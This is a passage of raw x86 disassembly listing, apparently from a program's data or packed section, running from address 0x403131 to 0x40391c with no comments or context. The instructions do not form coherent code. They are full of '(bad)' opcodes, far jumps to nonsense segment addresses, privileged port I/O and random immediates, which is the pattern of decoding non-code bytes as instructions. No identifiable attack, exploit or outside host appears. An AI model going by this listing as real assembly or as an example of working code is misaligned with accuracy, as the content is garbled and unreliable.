  403131:	scas   al,BYTE PTR es:[edi]
  403132:	sar    bh,0x3c
  403135:	test   ebp,edi
  403137:	xchg   edi,eax
  403138:	push   ebp
  403139:	imul   ebp,DWORD PTR [eax+0x3b],0x11
  40313d:	ror    DWORD PTR [ebp+0x985860c],cl
  403143:	shr    DWORD PTR [ebp-0x30],0x47
  403147:	call   0xe977:0xfc144c29
  40314e:	mov    bl,BYTE PTR [edi-0x376f0bd9]
  403154:	ins    DWORD PTR es:[edi],dx
  403155:	push   ecx
  403156:	ja     0x40314f
  403158:	mov    ah,0x4b
  40315a:	add    BYTE PTR [edi],dh
  40315c:	bound  esp,QWORD PTR [edx*8+0x107a8ee]
  403163:	push   edx
  403164:	adc    ebp,DWORD PTR [edx+0x65eee812]
  40316a:	sub    eax,0xc828b009
  40316f:	pop    ebp
  403170:	sub    al,cl
  403172:	rcr    BYTE PTR [esi],1
  403174:	sub    ch,BYTE PTR [edi-0x2d]
  403177:	push   esp
  403178:	fsub   DWORD PTR [edi+0x1f]
  40317b:	sub    ecx,edi
  40317d:	push   ds
  40317e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40317f:	mov    dh,BYTE PTR [eax+0x4f]
  403182:	test   al,0x72
  403184:	xor    bh,cl
  403186:	or     esp,DWORD PTR [edi-0x5f9acf06]
  40318c:	push   ebp
  40318d:	aas    
  40318e:	and    esp,DWORD PTR [edi-0x63cfda13]
  403194:	xchg   ebp,eax
  403195:	mov    ds:0xd5ff3e3f,eax
  40319a:	nop
  40319b:	lods   al,BYTE PTR ds:[esi]
  40319c:	fwait
  40319d:	rol    BYTE PTR [edi-0x32],cl
  4031a0:	fsub   QWORD PTR [edx-0x18]
  4031a3:	leave  
  4031a4:	mov    ecx,0x93487bcb
  4031a9:	(bad)  
  4031aa:	in     eax,dx
  4031ab:	push   0xffffffb0
  4031ad:	lea    edx,[ebx-0xb7fcd8e]
  4031b3:	inc    edx
  4031b4:	jp     0x40320a
  4031b6:	adc    esi,DWORD PTR [ecx+0x72]
  4031b9:	mov    ch,0x70
  4031bb:	in     al,dx
  4031bc:	sbb    eax,ebp
  4031be:	push   0xffffffc0
  4031c0:	pop    ebp
  4031c1:	test   ebp,ebx
  4031c3:	add    al,0x62
  4031c5:	fs jge 0x403215
  4031c8:	sub    ecx,DWORD PTR [edx-0x6ac41b99]
  4031ce:	mov    edi,0xec5666a3
  4031d3:	push   0xffffffae
  4031d5:	push   ds
  4031d6:	in     eax,dx
  4031d7:	and    edx,esp
  4031d9:	mov    edx,0x7b0072f4
  4031de:	imul   edi,ebx,0xb6b42d6e
  4031e4:	dec    eax
  4031e5:	(bad)  
  4031e6:	jle    0x4031e4
  4031e8:	jns    0x4031a6
  4031ea:	sahf   
  4031eb:	push   esi
  4031ec:	add    eax,esp
  4031ee:	xor    cl,dh
  4031f0:	ror    DWORD PTR [ecx-0x20],cl
  4031f3:	or     edi,ecx
  4031f5:	dec    ebx
  4031f6:	mov    ds:0x8c00fc78,al
  4031fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031fc:	mov    ah,0x46
  4031fe:	or     DWORD PTR [eax],0xef3414dc
  403204:	cwde   
  403205:	sbb    DWORD PTR [ebx+ebp*4-0x48],edx
  403209:	pusha  
  40320a:	jge    0x4031c5
  40320c:	in     eax,0x1a
  40320e:	add    eax,DWORD PTR ds:0x9b3706e4
  403214:	into   
  403215:	or     eax,0xd62f9244
  40321a:	ret    0x9fed
  40321d:	leave  
  40321e:	inc    edx
  40321f:	adc    ah,0xcd
  403222:	sbb    DWORD PTR [ebx+0x22],edi
  403225:	mov    ds:0x46a95d12,al
  40322a:	adc    DWORD PTR [ecx+0x32],0x64
  40322e:	dec    ebx
  40322f:	sub    BYTE PTR [eax+0x1a],dh
  403232:	daa    
  403233:	in     eax,dx
  403234:	in     eax,0x25
  403236:	addr16 in eax,dx
  403238:	cmp    ebp,DWORD PTR [ecx]
  40323a:	lds    edx,FWORD PTR [edi-0x3f]
  40323d:	push   0xe
  40323f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403240:	cmc    
  403241:	sbb    esi,DWORD PTR [ecx-0x6a]
  403244:	cmp    DWORD PTR [ebx],ebp
  403246:	add    ebp,DWORD PTR [esi-0x373e0cd1]
  40324c:	sar    BYTE PTR [ebx+0x11],cl
  40324f:	sbb    DWORD PTR [edx-0x51ef5b97],esi
  403255:	mov    eax,0xd5051446
  40325a:	add    ecx,DWORD PTR [esi+0x19c5e710]
  403260:	adc    bh,BYTE PTR [edx+0x133497fd]
  403266:	jmp    0x1a5bf76c
  40326b:	mov    bl,0x34
  40326d:	loope  0x4032e8
  40326f:	test   DWORD PTR [edi-0x52],0x5bf8134c
  403276:	fisttp WORD PTR [eax+0x67cee60c]
  40327c:	imul   BYTE PTR [eax+ebx*1]
  40327f:	loope  0x40327a
  403281:	mov    al,0x98
  403283:	add    BYTE PTR [ebx],dh
  403285:	mov    ecx,DWORD PTR [ebp+0x2a]
  403288:	enter  0x1596,0x84
  40328c:	xor    BYTE PTR [ebp-0x38],ah
  40328f:	and    al,0xfc
  403291:	mov    esi,0xeac385e2
  403296:	(bad)  
  403297:	inc    ah
  403299:	in     al,dx
  40329a:	fwait
  40329b:	mov    ch,0x49
  40329d:	nop
  40329e:	scas   eax,DWORD PTR es:[edi]
  40329f:	in     eax,dx
  4032a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032a1:	js     0x40328b
  4032a3:	pop    ebx
  4032a4:	dec    edi
  4032a5:	fstp   TBYTE PTR [edx-0x46]
  4032a8:	jle    0x4032ca
  4032aa:	nop
  4032ab:	lock rcl BYTE PTR [eax*4+0x509d5a29],0x36
  4032b4:	in     al,0x90
  4032b6:	push   eax
  4032b7:	in     eax,dx
  4032b8:	add    DWORD PTR [esi+0x1846a252],edi
  4032be:	ret    
  4032bf:	ret    0xeb9f
  4032c2:	mov    eax,0x8832b438
  4032c7:	ja     0x4032ed
  4032c9:	mov    esp,DWORD PTR [edx-0x67]
  4032cc:	jmp    DWORD PTR [ebx+0x4]
  4032cf:	test   DWORD PTR [edi-0x6e7fbbc7],esp
  4032d5:	jl     0x4032a3
  4032d7:	xchg   edi,eax
  4032d8:	inc    ecx
  4032d9:	push   cs
  4032da:	dec    edx
  4032db:	xor    DWORD PTR [esi-0xc],ebx
  4032de:	inc    edx
  4032df:	aad    0xe8
  4032e1:	mov    cl,0x88
  4032e3:	jg     0x40327d
  4032e5:	hlt    
  4032e6:	es ret 0xc91a
  4032ea:	test   al,0xaf
  4032ec:	loop   0x403302
  4032ee:	mov    esi,0x621fe2eb
  4032f3:	sbb    eax,0xd4058f09
  4032f8:	mov    WORD PTR [ecx],?
  4032fa:	pushf  
  4032fb:	ret    0xbacd
  4032fe:	cmp    eax,0xb8300db0
  403303:	xor    edx,DWORD PTR ds:0x902f185c
  403309:	xor    DWORD PTR [ebp-0x72],esp
  40330c:	jnp    0x403361
  40330e:	or     BYTE PTR ds:0x43ff2752,ah
  403314:	mov    BYTE PTR [esi-0x79d9ed2c],dh
  40331a:	dec    ecx
  40331b:	cwde   
  40331c:	idiv   DWORD PTR [eax]
  40331e:	jno    0x403366
  403320:	stos   DWORD PTR es:[edi],eax
  403321:	push   ebp
  403322:	pop    ebp
  403323:	lock xchg DWORD PTR [edi-0x32],eax
  403327:	push   es
  403328:	mov    ecx,0xbe610a20
  40332d:	inc    edi
  40332e:	leave  
  40332f:	jnp    0x40335f
  403331:	lea    ebp,[edi]
  403333:	mov    edi,0x8b8491cc
  403338:	stc    
  403339:	aad    0x7b
  40333b:	jmp    0xd630:0x6476f16a
  403342:	mov    dh,BYTE PTR [esi+0x431d0a28]
  403348:	stos   DWORD PTR es:[edi],eax
  403349:	(bad)  
  40334a:	push   ebx
  40334b:	adc    DWORD PTR [edx+0x712aa5f6],edx
  403351:	pop    ebx
  403352:	lds    ecx,FWORD PTR [ecx-0x28]
  403355:	add    esi,DWORD PTR [esi-0x9f21a80]
  40335b:	cmp    dl,ch
  40335d:	imul   esp,esp,0xa02cb3bb
  403363:	jb     0x403380
  403365:	jmp    0x4033b8
  403367:	scas   al,BYTE PTR es:[edi]
  403368:	dec    edx
  403369:	mov    esi,0xaae50b4b
  40336e:	stos   DWORD PTR es:[edi],eax
  40336f:	mov    bl,BYTE PTR [eax]
  403371:	xchg   DWORD PTR [edi],ebp
  403373:	retf   0x5caf
  403376:	mov    dh,BYTE PTR [ebx-0x5e]
  403379:	cdq    
  40337a:	imul   esp,DWORD PTR [esi+0x23],0xbec8fe05
  403381:	push   eax
  403382:	mov    ds:0x88dda973,al
  403387:	jbe    0x40338e
  403389:	rol    DWORD PTR [ebx+0x42],1
  40338c:	push   ss
  40338d:	or     BYTE PTR ds:0xbe5507bc,0x55
  403394:	adc    eax,0xfdb024d7
  403399:	test   eax,0x1dd0aa15
  40339e:	xor    al,0x2d
  4033a0:	mov    cl,0x82
  4033a2:	(bad)  
  4033a3:	xlat   BYTE PTR ds:[ebx]
  4033a4:	fwait
  4033a5:	push   0xaeffd40c
  4033aa:	in     eax,dx
  4033ab:	jnp    0x40337b
  4033ad:	jge    0x40339c
  4033af:	call   0x167d:0xde551f23
  4033b6:	ds push ds
  4033b8:	cs (bad) 
  4033ba:	fs or  cl,ah
  4033bd:	pop    ecx
  4033be:	stos   BYTE PTR es:[edi],al
  4033bf:	and    al,0xe7
  4033c1:	cs inc ebp
  4033c3:	rcl    BYTE PTR [eax-0x7ed5c41e],0xc7
  4033ca:	xor    DWORD PTR [esi+ebp*8+0x16aedba4],ebx
  4033d1:	sub    eax,0x3ed1ebd
  4033d6:	ss arpl bx,bx
  4033d9:	dec    edi
  4033da:	outs   dx,DWORD PTR ds:[esi]
  4033db:	or     eax,0xf0837116
  4033e0:	mov    bl,0xa7
  4033e2:	mov    ch,0x32
  4033e4:	mov    cl,ch
  4033e6:	je     0x4033c9
  4033e8:	adc    dh,BYTE PTR ds:0xb580eb58
  4033ee:	repnz pop es
  4033f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033f1:	je     0x40340d
  4033f3:	mov    cl,0x79
  4033f5:	xor    BYTE PTR [ebp+0x629414fa],0x61
  4033fc:	jmp    0x45c:0x2c62e8d5
  403403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403404:	call   0x1ad4:0x9eb17814
  40340b:	rcl    BYTE PTR [eax-0x6a],1
  40340e:	cmp    al,BYTE PTR [esi-0x2a852b8b]
  403414:	(bad)  
  403415:	cmc    
  403416:	rcr    BYTE PTR ds:0xe9ac755c,0xef
  40341d:	rcl    dl,0xdd
  403420:	sar    DWORD PTR [esi+0x39],0x4f
  403424:	js     0x4034a2
  403426:	mov    dh,0xb3
  403428:	add    bl,al
  40342a:	mov    cl,0x22
  40342c:	xchg   DWORD PTR [edi-0x8],esi
  40342f:	out    0x13,al
  403431:	cs xor eax,0xa896ae79
  403437:	jl     0x403454
  403439:	inc    esp
  40343a:	add    BYTE PTR [ebp+0x4b],dl
  40343d:	outs   dx,BYTE PTR ds:[esi]
  40343e:	test   DWORD PTR [edi+0x68],esi
  403441:	inc    esp
  403442:	fsubp  st(4),st
  403444:	or     ch,BYTE PTR [ebp+0x2a4a5053]
  40344a:	dec    ecx
  40344b:	push   es
  40344c:	mov    esp,0xb785f01b
  403451:	fwait
  403452:	adc    edi,DWORD PTR [esi]
  403454:	and    DWORD PTR [ebx-0xd3fdb81],0xffffffb0
  40345b:	push   edx
  40345c:	popa   
  40345d:	int3   
  40345e:	cld    
  40345f:	(bad)  
  403460:	std    
  403461:	nop
  403462:	jo     0x4034d5
  403464:	or     DWORD PTR fs:[ebx+0x6b],ecx
  403468:	lods   al,BYTE PTR ds:[esi]
  403469:	xchg   ecx,eax
  40346a:	or     ah,cl
  40346c:	pop    es
  40346d:	push   esi
  40346e:	xor    eax,0x2b848247
  403473:	dec    ebx
  403474:	pop    es
  403475:	shl    DWORD PTR [esi],1
  403477:	nop
  403478:	add    al,0x87
  40347a:	aaa    
  40347b:	inc    edx
  40347c:	or     dl,ah
  40347e:	adc    BYTE PTR [eax*8-0x518d9c2],bh
  403485:	and    ecx,esp
  403487:	aas    
  403488:	lds    esi,FWORD PTR ds:0x988d1f6c
  40348e:	xchg   edx,eax
  40348f:	sub    BYTE PTR [ecx],dl
  403491:	inc    DWORD PTR [esi]
  403493:	mov    esi,0x5f19fac2
  403498:	inc    ecx
  403499:	mov    cl,0x3d
  40349b:	les    eax,FWORD PTR [ecx]
  40349d:	xchg   edx,eax
  40349e:	daa    
  40349f:	dec    esp
  4034a0:	loopne 0x4034c5
  4034a2:	cmp    edi,0xfdf2c6c5
  4034a8:	leave  
  4034a9:	ret    0xf584
  4034ac:	jecxz  0x4034c0
  4034ae:	repz add ecx,esp
  4034b1:	cwde   
  4034b2:	pop    esp
  4034b3:	pop    ecx
  4034b4:	mov    BYTE PTR [eax],dh
  4034b6:	cmc    
  4034b7:	scas   al,BYTE PTR es:[edi]
  4034b8:	sbb    eax,0xd9ec63df
  4034bd:	cmp    bl,BYTE PTR [ebx]
  4034bf:	inc    esp
  4034c0:	into   
  4034c1:	imul   esi,DWORD PTR [ebp+0x6e9f343a],0xffffffd0
  4034c8:	or     BYTE PTR [ebp+0x3c],0xe
  4034cc:	or     DWORD PTR [esi+0x75],ebp
  4034cf:	xchg   edx,eax
  4034d0:	aas    
  4034d1:	mov    eax,0xf6604ee6
  4034d6:	dec    edx
  4034d7:	and    ebx,DWORD PTR [esi+0x8]
  4034da:	ret    
  4034db:	adc    al,0xd7
  4034dd:	push   ecx
  4034de:	sbb    al,0xae
  4034e0:	adc    esi,DWORD PTR [ecx+eiz*4+0x18b72702]
  4034e7:	mov    edi,0x7f6df34a
  4034ec:	and    al,0xa5
  4034ee:	dec    DWORD PTR [ebp-0x6925f841]
  4034f4:	mov    ebx,DWORD PTR [ecx-0x7e21da68]
  4034fa:	xchg   ebp,eax
  4034fb:	addr16 aaa 
  4034fd:	mov    WORD PTR [eax+0x4613e667],ss
  403503:	test   ah,bh
  403505:	mov    bh,ah
  403507:	neg    BYTE PTR ds:0xf89a315
  40350e:	xor    DWORD PTR [edi],edx
  403510:	dec    ebp
  403511:	or     cl,bh
  403513:	xchg   ebx,eax
  403514:	or     al,0xf
  403516:	lods   eax,DWORD PTR ds:[esi]
  403517:	cmp    eax,0x941970a4
  40351c:	jbe    0x4034ed
  40351e:	mov    eax,0xbfb7ebde
  403523:	mov    ds:0x9a6fc556,eax
  403528:	cmp    edx,ebp
  40352a:	inc    edx
  40352b:	sub    eax,0xf57eba2d
  403530:	js     0x403587
  403532:	dec    eax
  403533:	lods   al,BYTE PTR ds:[esi]
  403534:	xor    dh,bh
  403536:	imul   ebp,DWORD PTR [esi+0x1],0x3ef68c81
  40353d:	(bad)  
  40353e:	mov    bl,0x66
  403540:	fs int 0x2f
  403543:	sub    al,0xd4
  403545:	lds    edx,FWORD PTR [edi]
  403547:	(bad)  
  403548:	repz mov edx,0x1f93083a
  40354e:	adc    bh,0x8c
  403551:	pop    edx
  403552:	lea    esi,[ecx]
  403554:	xor    eax,0xc7773809
  403559:	aaa    
  40355a:	xlat   BYTE PTR ds:[ebx]
  40355b:	icebp  
  40355c:	imul   eax,ebx,0xffffffea
  40355f:	adc    BYTE PTR [ecx],bh
  403561:	pop    eax
  403562:	sub    bh,BYTE PTR [edx+0x63b5a178]
  403568:	(bad)  
  40356a:	xchg   ebp,eax
  40356b:	dec    esp
  40356c:	jo     0x403584
  40356e:	dec    ebx
  40356f:	sbb    eax,0x887a572d
  403574:	inc    eax
  403575:	mov    dh,0x5c
  403577:	push   0x2b7519aa
  40357c:	mov    ds,WORD PTR [edx-0x7cbccd1d]
  403582:	push   es
  403583:	pop    ds
  403584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403585:	ins    BYTE PTR es:[edi],dx
  403586:	inc    edi
  403587:	jns    0x403521
  403589:	inc    edx
  40358a:	lock in eax,dx
  40358c:	and    esp,esi
  40358e:	es (bad) 
  403591:	cmc    
  403592:	in     eax,0x18
  403594:	jbe    0x40358c
  403596:	les    edx,FWORD PTR [eax-0x47]
  403599:	mov    ebp,0x7acb0103
  40359e:	dec    edx
  40359f:	in     al,0xb6
  4035a1:	lahf   
  4035a2:	pop    ebp
  4035a3:	pop    esp
  4035a4:	aaa    
  4035a5:	sub    BYTE PTR [ebp+eiz*4-0x17],dh
  4035a9:	xor    bh,ch
  4035ab:	outs   dx,BYTE PTR ds:[esi]
  4035ac:	ins    BYTE PTR es:[edi],dx
  4035ad:	jb     0x4035b0
  4035af:	jle    0x4035f8
  4035b1:	sub    eax,0x19f156ab
  4035b6:	jl     0x4035e8
  4035b8:	rol    edx,1
  4035ba:	fmul   DWORD PTR [edi]
  4035bc:	pop    ecx
  4035bd:	popf   
  4035be:	mov    eax,DWORD PTR [edx+0xeac47af]
  4035c4:	mov    dl,0x9e
  4035c6:	daa    
  4035c7:	add    DWORD PTR [ecx-0x40df3cd5],0xd292fd22
  4035d1:	imul   esi,ebp,0xffffffa5
  4035d4:	mov    BYTE PTR [esi-0x29ea5675],ch
  4035da:	sbb    eax,0xea2ca1f3
  4035df:	cmp    DWORD PTR [edi],eax
  4035e1:	xchg   esi,esp
  4035e3:	xchg   ebp,eax
  4035e4:	xchg   edi,eax
  4035e5:	push   ds
  4035e6:	mov    BYTE PTR [ebp+0x74e29978],0x95
  4035ed:	mov    ebp,0x86e68594
  4035f2:	dec    esi
  4035f3:	outs   dx,BYTE PTR ds:[esi]
  4035f4:	xchg   ecx,eax
  4035f5:	scas   eax,DWORD PTR es:[edi]
  4035f6:	or     DWORD PTR [eax+0x5fc1d6a3],0xe92b05f
  403600:	inc    ecx
  403601:	(bad)
  403606:	mov    al,ds:0x9473a63a
  40360b:	test   DWORD PTR [ebx],ecx
  40360d:	(bad)  
  40360e:	cdq    
  40360f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403610:	adc    DWORD PTR [edi],esi
  403612:	repz mov eax,ds:0x4f49524e
  403618:	or     edi,DWORD PTR [ebp-0x575cbfa]
  40361e:	pushf  
  40361f:	mov    dl,ch
  403621:	sub    BYTE PTR [edx],dh
  403623:	cmp    al,0x40
  403625:	and    cl,0x2a
  403628:	ret    
  403629:	push   ebx
  40362a:	xchg   BYTE PTR ds:[ebx+0x6a],bh
  40362e:	or     edx,esp
  403630:	xchg   ebp,eax
  403631:	add    al,0xb4
  403633:	jmp    0x4035e2
  403635:	test   eax,0xe8e9f894
  40363a:	push   esp
  40363b:	adc    eax,0x1e8e6ee5
  403640:	test   al,0xee
  403642:	jae    0x403621
  403644:	mov    ds:0x5733857a,eax
  403649:	add    DWORD PTR [edi],0xfd6e65ce
  40364f:	(bad)  
  403650:	lods   al,BYTE PTR ds:[esi]
  403651:	mov    dh,al
  403653:	sbb    al,0x9e
  403655:	idiv   BYTE PTR [eax+eiz*1]
  403658:	retf   
  403659:	ss dec esp
  40365b:	inc    ecx
  40365c:	jnp    0x403680
  40365e:	iret   
  40365f:	test   eax,0xbf94bbc9
  403664:	mov    ds:0x15290191,al
  403669:	jecxz  0x4036d4
  40366b:	sub    eax,ebp
  40366d:	xor    BYTE PTR [ebp-0x7c],0xe1
  403671:	xchg   edx,eax
  403672:	shr    DWORD PTR ds:0x7b2284a6,1
  403678:	aaa    
  403679:	stos   DWORD PTR es:[edi],eax
  40367a:	jl     0x40368d
  40367c:	pop    ebx
  40367d:	hlt    
  40367e:	and    DWORD PTR [edx-0x53869b7f],ebp
  403684:	ins    DWORD PTR es:[edi],dx
  403685:	adc    ecx,DWORD PTR [ebx+ebx*2-0x20]
  403689:	enter  0x75e0,0x98
  40368d:	mov    al,0x8b
  40368f:	rcl    BYTE PTR [ecx+0x47],cl
  403692:	xchg   esp,eax
  403693:	dec    ebp
  403694:	rcr    DWORD PTR [esi+0x1e],0x74
  403698:	push   edx
  403699:	add    DWORD PTR [edx+0x2d],edx
  40369c:	jae    0x40367e
  40369e:	push   ss
  40369f:	mov    eax,0x717cecb6
  4036a4:	ss inc ebx
  4036a6:	fldpi  
  4036a8:	xor    BYTE PTR [ebp+0x5e],bl
  4036ab:	or     cl,BYTE PTR [edx-0x50a257bb]
  4036b1:	clc    
  4036b2:	and    ah,dh
  4036b4:	iret   
  4036b5:	pop    ebx
  4036b6:	jmp    0x4501169d
  4036bb:	xchg   edi,eax
  4036bc:	enter  0x5ec8,0x55
  4036c0:	or     esp,ebp
  4036c2:	mul    dl
  4036c4:	push   ebx
  4036c5:	das    
  4036c6:	mov    dh,0x80
  4036c8:	int    0xe1
  4036ca:	stos   BYTE PTR es:[edi],al
  4036cb:	xchg   ecx,eax
  4036cc:	dec    esp
  4036cd:	in     al,0x5c
  4036cf:	retf   
  4036d0:	into   
  4036d1:	inc    ecx
  4036d2:	outs   dx,DWORD PTR ds:[esi]
  4036d3:	mov    esp,0x999f22fb
  4036d8:	adc    dh,BYTE PTR [esi+0x5a]
  4036db:	dec    edi
  4036dc:	and    BYTE PTR [ebx+0x43],al
  4036df:	ja     0x4036ac
  4036e1:	add    al,BYTE PTR [esp+eiz*4-0x11647e6e]
  4036e8:	pop    ebx
  4036e9:	mov    ch,ch
  4036eb:	outs   dx,DWORD PTR ds:[esi]
  4036ec:	cs push esi
  4036ee:	push   0x22
  4036f0:	push   esp
  4036f1:	lods   eax,DWORD PTR ds:[esi]
  4036f2:	ror    ebp,0x90
  4036f5:	push   0xffffffe7
  4036f7:	inc    ebx
  4036f8:	loopne 0x4036ef
  4036fa:	sub    BYTE PTR [ecx+0x74e18f24],cl
  403700:	add    BYTE PTR [edx-0x80],al
  403703:	iret   
  403704:	xchg   esi,eax
  403705:	mov    al,0xe1
  403707:	sub    BYTE PTR [ebp+0x5137f4bb],ah
  40370d:	mov    ebp,0x35419077
  403712:	call   0x85b1dd9c
  403717:	pop    es
  403718:	mov    ecx,DWORD PTR [edx+esi*1-0x19]
  40371c:	pop    ds
  40371d:	mov    dl,0x92
  40371f:	retf   
  403720:	or     DWORD PTR [ebx+ebx*4],esi
  403723:	loope  0x40373f
  403725:	cmc    
  403726:	fdiv   QWORD PTR [ebx]
  403728:	loopne 0x40375a
  40372a:	add    ch,BYTE PTR [ecx-0x17c163ba]
  403730:	in     eax,dx
  403731:	mov    ecx,DWORD PTR [edi-0x27]
  403734:	dec    esp
  403735:	scas   eax,DWORD PTR es:[edi]
  403736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403737:	call   0xaeba282a
  40373c:	or     esi,0x42
  40373f:	ja     0x403716
  403741:	or     BYTE PTR ds:0x230439bd,0xb3
  403748:	and    eax,0xb2652b9a
  40374d:	jecxz  0x403739
  40374f:	inc    edx
  403750:	and    eax,0x4b61fb7a
  403755:	add    al,al
  403757:	sub    eax,0x7df9a36b
  40375c:	cmp    bh,al
  40375e:	cmp    al,0x16
  403760:	xor    eax,DWORD PTR [ebx]
  403762:	adc    ch,BYTE PTR ds:0x58085b1
  403768:	and    BYTE PTR [edx+0x46b96ec4],ah
  40376e:	jnp    0x4037dd
  403770:	cmp    cl,BYTE PTR [edx+0x5a660854]
  403776:	lahf   
  403777:	sbb    ah,ah
  403779:	xor    dl,ah
  40377b:	jl     0x403783
  40377d:	mov    ah,0xd5
  40377f:	xor    eax,edx
  403781:	imul   ecx,DWORD PTR [ebx+0x52],0xfffffff0
  403785:	int3   
  403786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403787:	sbb    al,0x6b
  403789:	push   ebp
  40378a:	sub    ch,al
  40378c:	enter  0xe1c0,0x2f
  403790:	xor    eax,0xb78fad12
  403795:	xchg   edx,eax
  403796:	stc    
  403797:	xchg   DWORD PTR [ebp-0x12],eax
  40379a:	pushf  
  40379b:	mov    bh,0x22
  40379d:	mov    fs,WORD PTR [eax]
  40379f:	add    al,dh
  4037a1:	test   BYTE PTR [edx+edi*2+0x23d89f6f],dh
  4037a8:	mov    dh,0xcd
  4037aa:	adc    cl,dh
  4037ac:	jg     0x4037b7
  4037ae:	fs cli 
  4037b0:	or     ebp,ecx
  4037b2:	sahf   
  4037b3:	cmp    bl,dh
  4037b5:	or     bh,dh
  4037b7:	fdivr  DWORD PTR [ebp-0x75]
  4037ba:	push   ecx
  4037bb:	and    eax,0x453c9921
  4037c0:	push   edx
  4037c1:	push   DWORD PTR [edi]
  4037c3:	rcr    dl,1
  4037c5:	cmp    esp,edx
  4037c7:	scas   eax,DWORD PTR es:[edi]
  4037c8:	mov    dl,0x8b
  4037ca:	int3   
  4037cb:	xchg   ebx,eax
  4037cc:	inc    ebp
  4037cd:	(bad)  
  4037ce:	cld    
  4037cf:	jns    0x4037cb
  4037d1:	iret   
  4037d2:	rol    DWORD PTR [ebp+0x32],1
  4037d5:	inc    ebp
  4037d6:	stc    
  4037d7:	loope  0x40380e
  4037d9:	loopne 0x4037fe
  4037db:	cmc    
  4037dc:	inc    eax
  4037dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037df:	shl    ebp,1
  4037e1:	ss sbb al,0xc2
  4037e4:	push   ebx
  4037e5:	push   ecx
  4037e6:	popa   
  4037e7:	out    dx,eax
  4037e8:	xor    al,BYTE PTR [eax+eax*8+0x279468c2]
  4037ef:	popf   
  4037f0:	test   eax,0xd2d5a154
  4037f5:	aaa    
  4037f6:	pop    edi
  4037f7:	bound  ebx,QWORD PTR [ecx+0x27]
  4037fa:	mov    dh,cl
  4037fc:	and    DWORD PTR [edx+0x66c71dbd],eax
  403802:	daa    
  403803:	repnz not BYTE PTR [eax+0x41e53bd8]
  40380a:	add    al,0x4d
  40380c:	dec    ecx
  40380d:	addr16 mov eax,fs
  403810:	or     DWORD PTR [eax],esp
  403812:	es fwait
  403814:	cmp    DWORD PTR [eax-0x8],edi
  403817:	clc    
  403818:	clc    
  403819:	clc    
  40381a:	daa    
  40381b:	and    DWORD PTR [edi],esp
  40381d:	mov    dh,0x3a
  40381f:	scas   al,BYTE PTR es:[edi]
  403820:	in     eax,0x15
  403822:	stos   BYTE PTR es:[edi],al
  403823:	mov    esi,0x4273b241
  403828:	mov    ds:0xb5bfb5bf,eax
  40382d:	sti    
  40382e:	inc    sp
  403830:	(bad)  
  403831:	(bad)  
  403833:	and    DWORD PTR [edi+0x54],0x24
  403837:	inc    esi
  403838:	or     DWORD PTR [esi-0x18576199],0xa101cbb
  403842:	jp     0x4037cb
  403844:	mov    BYTE PTR [ecx+0x4131f2ee],bl
  40384a:	cli    
  40384b:	je     0x40382a
  40384d:	dec    esi
  40384e:	repz cmp DWORD PTR [ebx],0xffffffec
  403852:	inc    edi
  403853:	sysexit 
  403855:	pop    edx
  403856:	nop
  403857:	push   eax
  403858:	mov    al,0x98
  40385a:	sub    BYTE PTR [esi+0x26],cl
  40385d:	iret   
  40385e:	xchg   DWORD PTR [esi],esi
  403860:	stos   BYTE PTR es:[edi],al
  403861:	sub    al,al
  403863:	push   es
  403864:	or     esp,DWORD PTR [edx+0x21d41994]
  40386a:	cmp    bh,dh
  40386c:	je     0x4038d9
  40386e:	pop    bp
  403870:	jo     0x403852
  403872:	cmp    DWORD PTR [esp+ebp*2+0x21],edx
  403876:	jmp    0x403899
  403878:	scas   al,BYTE PTR es:[edi]
  403879:	sub    ch,BYTE PTR [edi]
  40387b:	or     bl,BYTE PTR [ebp+0x14]
  40387e:	add    edi,DWORD PTR [eax]
  403880:	xlat   BYTE PTR ds:[ebx]
  403881:	adc    dl,BYTE PTR [ecx+esi*1+0x6aebab18]
  403888:	xchg   bh,dl
  40388a:	push   ss
  40388b:	pop    es
  40388c:	jmp    0x1b31:0x16ab1903
  403893:	arpl   WORD PTR [ecx-0x1f5c195c],sp
  403899:	shl    DWORD PTR [ecx+0x29cda2f2],1
  40389f:	test   eax,0x15bac571
  4038a4:	adc    ecx,DWORD PTR [esi-0x3d]
  4038a7:	or     eax,0xf63b2670
  4038ac:	sub    eax,ecx
  4038ae:	jo     0x4038d9
  4038b0:	inc    ecx
  4038b1:	hlt    
  4038b2:	dec    edx
  4038b3:	xchg   edi,eax
  4038b4:	sbb    DWORD PTR [ebp-0x674c2d0f],ebx
  4038ba:	xor    ebp,edi
  4038bc:	rcr    DWORD PTR [edi-0x12],cl
  4038bf:	in     al,0x11
  4038c1:	pop    edx
  4038c2:	dec    ebp
  4038c3:	mov    esi,0x55ee7afb
  4038c8:	not    DWORD PTR [ebx]
  4038ca:	add    eax,0x428a4631
  4038cf:	das    
  4038d0:	dec    edi
  4038d1:	pop    ss
  4038d2:	push   ecx
  4038d3:	cwde   
  4038d4:	inc    ecx
  4038d5:	cmp    eax,DWORD PTR [ebx+edx*1+0x5f]
  4038d9:	aas    
  4038da:	(bad)  [ebp+0x13dda3a0]
  4038e0:	adc    al,0x80
  4038e2:	inc    esi
  4038e3:	ret    
  4038e4:	mov    ds:0x478f26a,eax
  4038e9:	mov    eax,0xa8c3e545
  4038ee:	or     eax,0xaa1d8210
  4038f3:	in     al,0x1a
  4038f5:	mov    ebx,0x45c0584e
  4038fa:	in     eax,0x31
  4038fc:	ins    DWORD PTR es:[edi],dx
  4038fd:	out    dx,al
  4038fe:	sub    al,BYTE PTR [edi+0x71aab2cc]
  403904:	ror    DWORD PTR [edi],0x99
  403907:	dec    eax
  403908:	retf   
  403909:	xchg   ecx,eax
  40390a:	aad    0xd2
  40390c:	dec    ecx
  40390d:	mov    bh,0xb3
  40390f:	enter  0xe728,0xa4
  403913:	in     al,0x9c
  403915:	pop    es
  403916:	loopne 0x40396c
  403918:	je     0x40392c
  40391a:	and    dl,ah
  40391c:	adc    dh,BYTE PTR [edx+0x7d]
